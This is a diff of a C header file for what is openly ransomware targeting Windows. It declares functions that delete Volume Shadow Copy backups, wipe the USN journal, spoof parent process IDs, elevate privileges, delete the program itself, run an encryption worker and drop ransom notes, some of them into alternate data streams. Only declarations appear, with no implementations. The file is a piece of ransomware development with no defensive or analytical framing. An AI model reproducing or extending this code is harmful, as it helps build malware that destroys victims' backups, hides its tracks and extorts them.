@@ -1,43 +1,28 @@
-/* utils.h - Simplified utility interface */
+#pragma once
 #ifndef UTILS_H
 #define UTILS_H
-
 #include <windows.h>
+#include <stdbool.h>
 
-#ifdef __cplusplus
-extern "C" {
+/* ============================================================
+ * UTILITIES MODULE
+ * Backup destruction, privilege escalation, and misc tasks
+ * ============================================================ */
+
+/* VSS/Shadow Copy Deletion */
+bool UtilsNukeBackups(void);
+bool UtilsWipeUSNJournal(void);
+
+/* Process Utilities */
+DWORD UtilsFindProcessByName(const char* procName);
+
+/* System Optimization */
+void UtilsSetHighIOPriority(void);
+
+/* Ransom Note Delivery */
+bool UtilsDropRansomNote(const char *filePath, const char *noteContent);
+
+/* Error tracking */
+int UtilsGetLastError(void);
+
 #endif
-
-/* Stub - no longer needed */
-void InitAllSyscalls(void);
-
-/* PPID Spoofing */
-DWORD FindProcessPidStr(const char* procName);
-
-/* VSS deletion */
-void NukeBackupsCOM(void);
-void NukeBackups(void);
-
-/* USN Journal wipe */
-void WipeUSNJournal(void);
-
-/* ADS ransom note */
-void DropNoteADS(void);
-
-/* IO priority */
-void SetIoCrtitical(void);
-
-/* Self-delete */
-void SelfDeleteSpoofed(void);
-
-/* Original functions */
-void ElevatePrivileges(void);
-void DropNote(void);
-void SelfDelete(void);
-unsigned __stdcall EncryptionWorker(void* arg);
-
-#ifdef __cplusplus
-}
-#endif
-
-#endif /* UTILS_H */
